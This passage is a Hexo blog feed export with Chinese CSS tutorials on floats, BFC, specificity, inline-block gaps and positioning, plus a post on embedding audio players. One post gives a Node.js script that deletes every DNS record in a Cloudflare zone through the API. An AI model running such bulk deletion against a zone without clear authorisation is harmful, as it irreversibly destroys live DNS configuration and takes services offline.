left;&#125;</span><br></pre></td></tr></table></figure><p>这里我没有给最外层的DIV.outer 设置高度，但是我们知道如果它里面的元素不浮动的话，那么这个外层的高是会自动被撑开的。但是当内层元素浮动后，就出现了以下影响：<br>（1）背景不能显示 （2）边框不能撑开 （3）margin 设置值不能正确显示</p><h2 id="清除css浮动："><a href="#清除css浮动：" class="headerlink" title="清除css浮动："></a>清除css浮动：</h2><blockquote><p>方法一：为浮动子元素添加 新的兄弟元素  、应用 clear：both；</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;outer&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div1&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div2&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div3&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;clear&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">.clear&#123;clear:both; height: 0; line-height: 0; font-size: 0&#125;</span><br><span class="line">result： （纠正： padding不会受影响）</span><br></pre></td></tr></table></figure><p><img src="/posts/qing-chu-fu-dong-tan-tao/3.webp" alt="pic2"></p><blockquote><p>方法二：父级div定义 overflow: auto（注意：是父级div也就是这里的  div.outer）</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;outer over-flow&quot;</span>&gt;</span> //这里添加了一个class</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div1&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div2&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div3&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">.over-flow&#123;</span><br><span class="line">    overflow: auto; zoom: 1; //zoom: 1; 是在处理兼容性问题</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理：使用overflow属性来清除浮动有一点需要注意，overflow属性共有三个属性值：hidden,auto,visible。我们可以使用hiddent和auto值来清除浮动，但切记不能使用visible值，如果使用这个值将无法达到清除浮动效果，其他两个值都可以，其区据说在于一个对seo比较友好，另个hidden对seo不是太友好，其他区别我就说不上了，也不浪费时间。</p><blockquote><p>方法三： 据说是最高大上的方法  :after 方法：（注意：作用于浮动元素的父亲）<br>先说原理：这种方法清除浮动是现在网上最拉风的一种清除浮动，他就是利用:after和:before来在元素内部插入两个元素块，从面达到清除浮动的效果。其实现原理类似于clear:both方法，只是区别在于:clear在html插入一个div.clear标签，而outer利用其伪类clear:after在元素内部增加一个类似于div.clear的效果。下面来看看其具体的使用方法：</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.outer</span> &#123;<span class="attribute">zoom</span>:<span class="number">1</span>;&#125; <span class="comment">/* for IE6/7 Maxthon2*/</span></span><br><span class="line"><span class="selector-class">.outer</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line"><span class="attribute">clear</span>:both;</span><br><span class="line"><span class="attribute">content</span>:<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="attribute">display</span>:block;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">visibility</span>:hidden;</span><br><span class="line">&#125;  <span class="comment">/* for FF/chrome/opera/IE8 */</span></span><br></pre></td></tr></table></figure><p>其中clear:both;指清除所有浮动；content: ‘.’; display:block;对于FF&#x2F;chrome&#x2F;opera&#x2F;IE8不能缺少，其中content可以取值也可以为空。visibility:hidden;的作用是允许浏览器渲染它，但是不显示出来，这样才能实现清楚浮动。</p><p>注意：下一标签直接清除浮动兄弟标签浮动时，在下一标签的属性中直接写入清除clear:both;这样就可以清除以上标签的浮动而不用加入空标签来清除浮动。</p><p>结语：清除浮动的方式虽然是有很多种，但是不是每种都适合你，也不是每种都能很好的兼容所有浏览器，所以参照你觉得最好的方式去做，个人觉得方法三不错，不需多于的标签，而且也能很好的兼容。再次again：当一个内层元素是浮动的时候，如果没有关闭浮动时，其父元素也就不会再包含这个浮动的内层元素，因为此时浮动元素已经脱离了文档流。也就是为什么外层不能被撑开了！</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>margin重叠与BFC探讨</title>
      <link href="/posts/margin-chong-die-yu-bfc-tan-tao/"/>
      <url>/posts/margin-chong-die-yu-bfc-tan-tao/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/renshengruge/p/6369762.html"  target="_self" >https://www.cnblogs.com/renshengruge/p/6369762.html</a><br><a href="https://www.cnblogs.com/leejersey/p/3991398.html"  target="_self" >https://www.cnblogs.com/leejersey/p/3991398.html</a>             </p><div id="cnblogs_post_body" class="blogpost-body"><h3><strong><code>CSS2.1</code>的盒模型中规定的内容——<code>Collapsing margins</code>：</strong></h3><p><span style="color: #0000ff">所有毗邻的两个或更多盒元素的 上下margin 将会合并为一个margin共享之。</span></p><p><span style="color: #0000ff">毗邻的定义为：同级或者嵌套的盒元素，并且它们之间没有非空内容、Padding或Border分隔。</span></p><p>&nbsp;</p><p>解决办法：【触发BFC】</p><p><span style="color: #000000">给<span style="color: #3366ff">父元素</span>加上&nbsp;<span style="color: #3366ff"><code>padding替代margin/1px透明border/1px的padding/overflow:hidden<span style="color: #888888">(IE要添加zoom:1)</span></code></span>，</span></p><p><span style="color: #000000">或者给<span style="color: #3366ff">父元素/子元素</span>设置为&nbsp;<span style="color: #3366ff"><code>float或position:absolute/fixed.或display设置为：inline-block、 inline-flex、 inline-grid、 或table-caption等【或设置父元素为flex、grid、table-cell也可，但子元素不行】</code></span></span></p><p><span style="color: #000000">(<code>CSS2.1</code>规定浮动元素和绝对定位元素不参与<code>margin</code>折叠)。</span></p><p>&nbsp;</p></div><p><strong>1.BFC 是什么？</strong><br>BFC (Block Formatting Contexts) 即块级格式化上下文，从样式上看，它与普通的容器没有什么区别，但是从功能上，BFC 可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器没有的一些特性，例如可以包含浮动元素，上面的第二类方法（如 overflow 方法）就是触发了父元素的 BFC ，使到它可以包含浮动元素，从而防止出现高度塌陷的问题。</p><p><strong>2.如何触发 BFC</strong><br>触发 BFC 的条件如下：</p><blockquote><p>1.浮动，float 除 none 以外的值<br>2.绝对定位，position（absolute，fixed）<br>3.display为以下其中之一，inline-block、table-cell、table-caption、 inline-flex、 或 inline-grid等<br>4.overflow 除了 visible以外的值（hidden，auto，scroll） </p></blockquote><blockquote><p>在 CSS3 中，BFC 叫做 Flow Root，并增加了一些触发条件：<br>display 的 table-caption 值 position 的 fixed 值，其实 fixed 是 absolute 的一个子类，因此在 CSS2.1 中使用这个值也会触发 BFC ，只是在 CSS3 中更加明确了这一点。</p></blockquote><p><strong>3.BFC 主要有三个特性：</strong></p><p><em><strong>(1) BFC 会阻止外边距折叠</strong></em><br>两个相连的 div 在 <strong>垂直 方向上的</strong> 外边距会发生叠加，有些书籍会把这个情况列作 bug ，这里 Kayo 并不同意，这种折叠虽然会给不熟悉 CSS 布局的开发者带来一些不便，但实际上它具有完整且具体的折叠规则，并且在主流浏览器中都存在，因此 Kayo 更认为这应该是 CSS 的特性。当然，在实际开发中，或许我们有时会不需要这种折叠，这时可以利用 BFC 的其中一个特性——阻止外边距叠加。</p><p><strong>阻止 外边距 重叠</strong>的方式：</p><p>情况一、<strong>父、子元素之间</strong> 的外边距</p><blockquote><p>方式1、为 <strong>父元素</strong> 设置属性<br>1-1、设置属性（absolutu&#x2F;fixed、左右float、inline-…、<strong>overflow:hidden</strong>），以激活父元素的BFC。<br>1-2、父元素也可以设置 边框&#x2F;padding，如border:1px solid transparent。<br>方式2、为 <strong>子元素</strong> 设置属性，以激活 子元素的BFC<br>设置属性（absolutu&#x2F;fixed、左右float、inline-…）。</p></blockquote><p>情况二、<strong>2个兄弟元素之间</strong> 的外边距（激活 元素的BFC）</p><blockquote><p>方式1、为 <strong>元素本身</strong> 设置属性（absolutu&#x2F;fixed、左右float、inline-…。<strong>没有overflow！</strong>）。<br>【注意：】<br>1.overflow:hidden在兄弟元素之间 无效。<br>2.脱离文档流会对 后面兄弟元素的布局会产生影响！只能给第2个元素设置（absolutu&#x2F;fixed、左右float）。<br>方式2、 <strong>元素 外层加个包裹</strong> 为<strong>包裹</strong>设置 属性<strong>overflow:hidden</strong>，激活 包裹 的BFC，将其子元素的 外边距 包裹在里面。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="selector-class">.box</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">            <span class="attribute">width</span>: <span class="number">100px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">            <span class="attribute">background</span>: <span class="number">#5aa878</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">            <span class="attribute">margin</span>: <span class="number">50px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="selector-class">.container</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">            <span class="attribute">overflow</span>: hidden;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;container&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="comment">&lt;!-- &lt;div class=&quot;container&quot;&gt; --&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="comment">&lt;!-- &lt;/div&gt; --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><em><strong>(2) BFC 可以包含浮动的元素（清除浮动影响 方式之一）</strong></em><br>这也正是上面使用 overflow: hidden 与 overflow: auto 方法闭合浮动的原理，使用 overflow: hidden 或 overflow: auto 触发浮动元素父元素的 BFC 特性，从而可以包含浮动元素，闭合浮动。</p><p>W3C 的原文是“’Auto’ heights for block formatting context roots”，也就是 BFC 会根据子元素的情况自动适应高度，即使其子元素中包括浮动元素。</p><p>但是 IE6-7 并不支持 W3C 的 BFC ，而是使用自产的 hasLayout 。从表现上来说，它跟 BFC 很相似，只是 hasLayout 自身存在很多问题，导致了 IE6-7 中一系列的 bug 。触发 hasLayout 的条件与触发 BFC 有些相似，具体情况 Kayo 会另写文章介绍。这里 Kayo 推荐为元素设置 IE 特有的 CSS 属性 zoom: 1 触发 hasLayout ，zoom 用于设置或检索元素的缩放比例，值为“1”即使用元素的实际尺寸，使用 zoom: 1 既可以触发 hasLayout 又不会对元素造成其他影响，相对来说会更为方便。</p><p><em><strong>(3) BFC 可以阻止元素被浮动元素覆盖</strong></em><br>浮动元素的block兄弟元素会无视浮动元素的位置，尽量占满一整行，这样该block元素就会被浮动的兄弟元素遮盖，为 该block兄弟元素 触发 BFC 后可以阻止这种情况的发生。</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Css选择器优先级与权重</title>
      <link href="/posts/css-xuan-ze-qi-you-xian-ji-yu-quan-chong/"/>
      <url>/posts/css-xuan-ze-qi-you-xian-ji-yu-quan-chong/</url>
      
        <content type="html"><![CDATA[<h2 id="各种选择器-优先级"><a href="#各种选择器-优先级" class="headerlink" title="各种选择器 优先级"></a>各种选择器 优先级</h2><p>1.第一优先级：<code>!important</code>会覆盖页面内任何位置的元素样式，权值为 无穷大<br>2.内联（行内）样式，如<code>style=&quot;color: green&quot;</code>，权值为1,0,0,0<br>3.ID选择器，如#app，权值为0,1,0,0<br>4.类、伪类、属性选择器，如<code>.foo, :first-child, div[class=&quot;foo&quot;]</code>，权值为0,0,1,0<br>5.标签、伪元素选择器，如<code>div::first-line</code>，权值为0,0,0,1<br>6.通配选择器，如<code>*&#123;&#125;</code>，权值为0,0,0,0<br>7.继承 的样式没有权值。（补充，<code>&lt;td align=&quot;right&quot;&gt;</code>，<code>&lt;img width=&quot;10&quot;&gt;</code>等标签 属性的 自带样式，优先级 不高于 继承样式）</p><h2 id="权重-计算规则"><a href="#权重-计算规则" class="headerlink" title="权重 计算规则"></a>权重 计算规则</h2><p><em>【重要：以上数字，非 十进制！eg：0,0,0,5+0,0,0,6&#x3D;0,0,0,11 小于0,0,1,1】</em><br>在层级选择器（子代，后代，兄弟，通用兄弟选择器）中。被 多类 选择器 选中的某元素，计算权重时， 分类别、按个数 分别相加 计算权重。总权重 相等 时，还要考虑 样式的 继承性、后来居上 等特性。<br>一般情况下，只从中直接选取 最高优先级 的 选择器类别 按个数计算大概权重，即可。<br>行内（内联）样式：<code>&lt;div style=&quot;color:red;&quot;&gt;</code><br>外部样式：<code>&lt;link&gt;</code>或<code>@import</code>引入<code>.css文件</code><br>内部（内嵌）样式：<code>&lt;style&gt;</code>中嵌入代码</p><h2 id="需注意："><a href="#需注意：" class="headerlink" title="需注意："></a>需注意：</h2><p>1.权重相同的情况下，位于后面的样式会覆盖前面的样式<br>2.通配符、子选择器、兄弟选择器，虽然权重为0,0,0,0，但是优先于继承的样式<br>3.对于 同一类别 的选择器，要分类别、个数相加 计算 最终权重！</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CF区域DNS批量删除</title>
      <link href="/posts/cf-qu-yu-dns-pi-liang-shan-chu/"/>
      <url>/posts/cf-qu-yu-dns-pi-liang-shan-chu/</url>
      
        <content type="html"><![CDATA[<h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><blockquote><p><strong>1.默认 每次删除100条dns记录</strong><br><strong>2.只有 Authorization（API 令牌）；或X-Auth-Email和X-Auth-Key（全局 API 密钥）同时</strong><br><strong>3.注意分配给apiToken的 细粒度权限</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const axios = require(&#x27;axios&#x27;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 替换为你的Cloudflare API Token和Zone ID</span><br><span class="line">const apiToken = &#x27;xxxxxxxxxxxxxxxxx&#x27;;</span><br><span class="line">const zoneId = &#x27;xxxxxxxxxxxxxxxxxxx&#x27;;</span><br><span class="line"></span><br><span class="line">// 设置请求头</span><br><span class="line">const headers = &#123;</span><br><span class="line">  &#x27;Authorization&#x27;: `Bearer $&#123;apiToken&#125;`,</span><br><span class="line">// &#x27;X-Auth-Email&#x27;:&#x27;xxxxxxxx@gmail.com&#x27;,</span><br><span class="line">// &#x27;X-Auth-Key&#x27;:&#x27;xxxxxxxxxxxxxxxxxxx&#x27;,</span><br><span class="line">  &#x27;Content-Type&#x27;: &#x27;application/json&#x27;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// 获取DNS记录的URL</span><br><span class="line">const url = `https://api.cloudflare.com/client/v4/zones/$&#123;zoneId&#125;/dns_records`;</span><br><span class="line"></span><br><span class="line">// 获取DNS记录并删除</span><br><span class="line">axios.get(url, &#123; headers &#125;)</span><br><span class="line">  .then(response =&gt; &#123;</span><br><span class="line">    const dnsRecords = response.data.result;</span><br><span class="line">      const deletePromises = dnsRecords.map(record =&gt; &#123;</span><br><span class="line">      console.log(`Attempting to delete record: $&#123;record.name&#125;`);</span><br><span class="line">      return axios.delete(`$&#123;url&#125;/$&#123;record.id&#125;`, &#123; headers &#125;)</span><br><span class="line">        .then(() =&gt; &#123;</span><br><span class="line">          console.log(`Deleted record: $&#123;record.name&#125;`);</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(error =&gt; &#123;</span><br><span class="line">          console.error(`Failed to delete record: $&#123;record.name&#125;`, error.response ? error.response.data : error.message);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;); </span><br><span class="line">return Promise.all(deletePromises);</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(() =&gt; &#123;</span><br><span class="line">    console.log(&#x27;Batch deletion completed.&#x27;);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(error =&gt; &#123;</span><br><span class="line">    console.error(&#x27;Failed to fetch DNS records:&#x27;, error.response ? error.response.data : error.message);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Inline-Block间隙消除</title>
      <link href="/posts/inline-block-jian-xi-xiao-chu/"/>
      <url>/posts/inline-block-jian-xi-xiao-chu/</url>
      
        <content type="html"><![CDATA[<div class="tip cogs"><p>float元素之间是没有间距的。inline-block兄弟元素之间，如何像flaot元素那样，去掉inline-block元素间的间隙？</p></div><h2 id="方法一：父元素设置font-size为0，子元素单独再设置字体大小"><a href="#方法一：父元素设置font-size为0，子元素单独再设置字体大小" class="headerlink" title="方法一：父元素设置font-size为0，子元素单独再设置字体大小"></a>方法一：父元素设置font-size为0，子元素单独再设置字体大小</h2><h2 id="方法二：设置字符间距letter-spacing，或单词间距word-spacing"><a href="#方法二：设置字符间距letter-spacing，或单词间距word-spacing" class="headerlink" title="方法二：设置字符间距letter-spacing，或单词间距word-spacing"></a>方法二：设置字符间距letter-spacing，或单词间距word-spacing</h2><p>这个方法的原理有点像一所用的font-size，具体做法是给父元素一个letter-spacing或者word-spacing的负值（稍微大一点，比如 -6px），子元素再调整为0即可，具体使用字符间距还是单词间距其实大同小异。</p><h2 id="方法三：直接采用使用Flex或float布局（这样处理的三栏式布局没必要用inline-block）"><a href="#方法三：直接采用使用Flex或float布局（这样处理的三栏式布局没必要用inline-block）" class="headerlink" title="方法三：直接采用使用Flex或float布局（这样处理的三栏式布局没必要用inline-block）"></a>方法三：直接采用使用Flex或float布局（这样处理的三栏式布局没必要用inline-block）</h2><h2 id="方法四：设置margin-right为负值"><a href="#方法四：设置margin-right为负值" class="headerlink" title="方法四：设置margin-right为负值"></a>方法四：设置margin-right为负值</h2><p>用margin负值来抵掉元素间的空白，不过margin负值的大小与上下文的字体和文字大小相关，并且同一大小的字体，元素之间的间距在不同浏览器下是不一样的，如：font-size:16px时，Chrome下元素之间的间距为8px,而Firefox下元素之间的间距为4px。所以这个方法并不通用，也相对比较麻烦，因此不太推荐使用。</p><div class="tip cogs"><p>以下方式不规范，不推荐！！！</p></div><h2 id="方法五（通过修改html格式）："><a href="#方法五（通过修改html格式）：" class="headerlink" title="方法五（通过修改html格式）："></a>方法五（通过修改html格式）：</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>one&lt;/li  </span><br><span class="line">    &gt;<span class="tag">&lt;<span class="name">li</span>&gt;</span>two&lt;/li  </span><br><span class="line">    &gt;<span class="tag">&lt;<span class="name">li</span>&gt;</span>three<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- or --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>one<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="comment">&lt;!--  </span></span><br><span class="line"><span class="comment">    --&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>two<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="comment">&lt;!--  </span></span><br><span class="line"><span class="comment">    --&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>three<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Absolute探讨</title>
      <link href="/posts/absolute-tan-tao/"/>
      <url>/posts/absolute-tan-tao/</url>
      
        <content type="html"><![CDATA[<p>文章本来写完了，正发布时网站崩溃了。自动保存个球。还有插图全没了！！！</p><h2 id="亲测，直接上重点总结：：："><a href="#亲测，直接上重点总结：：：" class="headerlink" title="亲测，直接上重点总结：：："></a>亲测，直接上重点总结：：：</h2><p>1.兄弟元素中间，至少一个absolute。该absolute元素 相对于 最近的外层（父、祖先级元素）relative定位，没有就直接相对于窗口定位。给方向后，让去哪里才去哪里。没有指定方向时，原地悬浮，纹丝不动！！！</p><p>2.祖父relative，【父 无论relative，还是absolute】。子元素absolute。该absolute子元素 相对于 父级 定位。</p><p>3.祖父relative，【父 不设置position】。子元素absolute。此情况 同上1.<br>该absolute子元素 相对于 祖父级 定位。</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Audio控件插入</title>
      <link href="/posts/audio-kong-jian-cha-ru/"/>
      <url>/posts/audio-kong-jian-cha-ru/</url>
      
        <content type="html"><![CDATA[<div class="tabs" id="安知鱼audio嵌入"><ul class="nav-tabs"><button type="button" class="tab " data-href="安知鱼audio嵌入-1">Tag Plugins的audio</button><button type="button" class="tab  active" data-href="安知鱼audio嵌入-2">自定义标签</button></ul><div class="tab-contents"><div class="tab-item-content" id="安知鱼audio嵌入-1"><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio 音频链接 %&#125;</span><br></pre></td></tr></table></figure><p><strong>效果：</strong></p><div class="audio"><audio controls preload><source src='https://api.i-meto.com/meting/api?server=netease&type=url&id=466794344&auth=e7271f8ddd3ba21e06cd210b53c0562248f94d25' type='audio/mp3'>Your browser does not support the audio tag.</audio></div></div><div class="tab-item-content active" id="安知鱼audio嵌入-2"><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 用法一（MetingJS API） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meting-js</span> <span class="attr">id</span>=<span class="string">&quot;2611181089&quot;</span> <span class="attr">server</span>=<span class="string">&quot;netease&quot;</span> <span class="attr">type</span>=<span class="string">&quot;song&quot;</span> <span class="attr">mutex</span>=<span class="string">&quot;true&quot;</span> <span class="attr">preload</span>=<span class="string">&quot;none&quot;</span> <span class="attr">theme</span>=<span class="string">&quot;var(--anzhiyu-main)&quot;</span> <span class="attr">data-lrctype</span>=<span class="string">&quot;0&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">meting-js</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 用法二（播放页面 链接） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meting-js</span> <span class="attr">auto</span>=<span class="string">&quot;https://music.163.com/playlist?id=13830672260&quot;</span> <span class="attr">mutex</span>=<span class="string">&quot;true&quot;</span>  <span class="attr">preload</span>=<span class="string">&quot;none&quot;</span> <span class="attr">data-lrctype</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">meting-js</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>效果：</strong><br><meting-js id="2611181089" server="netease" type="song" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" ></meting-js></p><p><meting-js auto="https://music.163.com/playlist?id=13830672260" mutex="true" preload="none" data-lrctype="0" theme="var(--anzhiyu-main)"></meting-js></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to 